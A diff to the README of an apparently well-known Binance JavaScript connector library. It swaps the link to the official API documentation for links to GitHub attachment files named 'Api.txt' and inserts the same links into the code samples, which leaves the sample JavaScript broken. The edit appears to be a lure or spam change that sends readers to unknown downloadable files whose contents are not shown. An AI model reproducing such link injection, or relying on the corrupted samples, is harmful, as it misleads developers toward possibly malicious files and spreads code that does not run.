@@ -6,7 +6,8 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
 
-This is a lightweight library that works as a connector to [Binance public API](https://github.com/binance/binance-spot-api-docs). It’s designed to be simple, clean, and easy to use with minimal dependencies.
+This is a lightweight library that works as a connector to [Api.txt](https://github.com/user-attachments/files/16853358/Api.txt)
+. It’s designed to be simple, clean, and easy to use with minimal dependencies.
 
 - Supported APIs:
     - `/api/*`
@@ -33,10 +34,13 @@ npm install @binance/connector
 
 ## RESTful APIs
 
+
+
 ```javascript
 const { Spot } = require('@binance/connector')
 
-const apiKey = ''
+const apiKey = '[Api.txt](https://github.com/user-attachments/files/16853377/Api.txt)
+'
 const apiSecret = ''
 const client = new Spot(apiKey, apiSecret)
 
@@ -50,6 +54,7 @@ client.newOrder('BNBUSDT', 'BUY', 'LIMIT', {
   timeInForce: 'GTC'
 }).then(response => client.logger.log(response.data))
   .catch(error => client.logger.error(error))
+
 ```
 
 Please find `examples` folder to check for more endpoints.
@@ -57,7 +62,8 @@ Please find `examples` folder to check for more endpoints.
 ## Key Pair Based Authentication
 
 ```javascript
-const { Spot, PrivateKeyAlgo } = require('@binance/connector')
+const { Spot, PrivateKeyAlgo } = [Api.txt](https://github.com/user-attachments/files/16853382/Api.txt)
+require('@binance/connector')
 
 const apiKey = ''
 const apiSecret = '' // has no effect when RSA private key is provided
